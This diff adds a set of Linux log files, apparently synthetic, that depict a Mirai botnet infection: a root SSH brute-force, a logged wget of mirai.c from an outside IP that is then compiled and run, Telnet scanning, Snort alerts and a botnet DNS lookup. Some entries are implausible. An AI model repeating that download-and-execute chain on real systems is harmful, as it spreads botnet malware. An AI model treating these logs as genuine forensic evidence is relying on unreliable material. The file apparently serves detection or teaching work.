@@ -1,0 +1,49 @@
+# /var/log/auth.log
+May  5 07:45:23 ubuntu-desktop sudo:    alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+May  5 07:45:25 ubuntu-desktop sudo: pam_unix(sudo:session): session opened for user root by alice(uid=0)
+May  5 07:46:02 ubuntu-desktop sudo: pam_unix(sudo:session): session closed for user root
+May  5 08:00:15 ubuntu-desktop gdm-password]: Greeter start authentication for alice
+May  5 08:00:20 ubuntu-desktop gdm-password]: pam_unix(gdm-password:session): session opened for user accounting by (uid=0)
+May  5 17:30:45 ubuntu-desktop systemd-logind: New session 3 of user accounting.
+May  5 17:30:45 ubuntu-desktop gnome-shell: Starting GNOME Shell version 44.1
+
+# /var/log/syslog
+May  5 07:45:23 ubuntu-desktop systemd[1]: Started Daily apt upgrade and clean activities.
+May  5 07:45:24 ubuntu-desktop apt.systemd.daily[1234]: Checking apt upgrade...
+May  5 07:45:50 ubuntu-desktop apt.systemd.daily[1234]: Package lists updated successfully.
+May  5 12:15:35 ubuntu-desktop NetworkManager[567]: <info>  [1683304535.1314]  device (wlp3s0): state change: disconnected -> activated (reason 'connection-assumed')
+May  5 18:01:15 ubuntu-desktop systemd[1]: Started Mirai Infection Service.
+
+# /var/log/auth.log (Brute-force Attempts)
+May  5 18:01:10 ubuntu-desktop sshd[3000]: Failed password for root from 198.51.100.200 port 52300 ssh2
+May  5 18:01:12 ubuntu-desktop sshd[3000]: Failed password for root from 198.51.100.201 port 52301 ssh2
+May  5 18:01:14 ubuntu-desktop sshd[3000]: Accepted password for root from 198.51.100.202 port 52302 ssh2
+May  5 18:01:15 ubuntu-desktop sshd[3000]: pam_unix(sshd:session): session opened for user root by (uid=0)
+
+# Mirai Payload Execution
+May  5 18:01:16 ubuntu-desktop bash[3010]: cd /tmp && wget http://203.0.113.77/mirai.c -O mirai.c
+May  5 18:01:20 ubuntu-desktop bash[3010]: gcc mirai.c -o mirai
+May  5 18:01:22 ubuntu-desktop bash[3010]: chmod +x mirai
+May  5 18:01:23 ubuntu-desktop bash[3010]: nohup ./mirai &> /dev/null &
+May  5 18:01:23 ubuntu-desktop systemd[1]: Started Mirai Binary Service.
+
+# /var/log/kern.log
+May  5 18:01:23 ubuntu-desktop kernel: [35010.000000] mirai invoked: new process from pid=3010
+May  5 18:01:25 ubuntu-desktop kernel: [35012.123456] nf_conntrack: new TCP service registered for scanning
+May  5 18:01:30 ubuntu-desktop kernel: [35017.345678] random: crng init done
+
+# /var/log/ufw.log
+May  5 18:01:30 ubuntu-desktop kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=203.0.113.1 DST=192.0.2.10 LEN=60 PROTO=TCP SPT=42000 DPT=23 WINDOW=8192 RES=0x00 SYN URGP=0
+May  5 18:01:30 ubuntu-desktop kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=203.0.113.1 DST=192.0.2.45 LEN=60 PROTO=TCP SPT=42001 DPT=23 WINDOW=8192 RES=0x00 SYN URGP=0
+May  5 18:01:31 ubuntu-desktop kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=203.0.113.1 DST=192.0.2.78 LEN=60 PROTO=TCP SPT=42002 DPT=23 WINDOW=8192 RES=0x00 SYN URGP=0
+
+# /var/log/snort/alert
+[**] [1:2001219:2] ET SCAN Potential Mirai Scan [**]
+05/05-18:01:30.123456 203.0.113.1:42000 -> 192.0.2.10:23
+[**] [1:2001219:2] ET SCAN Potential Mirai Scan [**]
+05/05-18:01:30.567890 203.0.113.1:42001 -> 192.0.2.45:23
+
+# /var/log/dnsmasq.log
+May  5 18:02:10 dnsmasq[574]: query[A] botnet.ddns.net from 127.0.0.1
+May  5 18:02:10 dnsmasq[574]: forwarded botnet.ddns.net to 8.8.8.8
+May  5 18:02:11 dnsmasq[574]: reply botnet.ddns.net is 198.51.100.99
